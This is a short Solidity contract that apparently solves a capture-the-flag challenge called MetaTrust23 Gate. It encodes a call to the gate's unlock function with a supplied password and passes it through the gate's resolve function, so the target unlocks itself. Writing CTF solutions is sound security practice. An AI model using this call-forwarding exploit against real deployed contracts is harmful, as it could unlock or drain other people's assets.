// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Gate.sol";

contract GateAttackMetaTrust23 {

    function attack(address target, bytes memory password) public {
	    GateMetaTrust23 g = GateMetaTrust23(target);
        bytes memory data = abi.encodeWithSignature("unlock(bytes)", password);
        g.resolve(data);
    }

}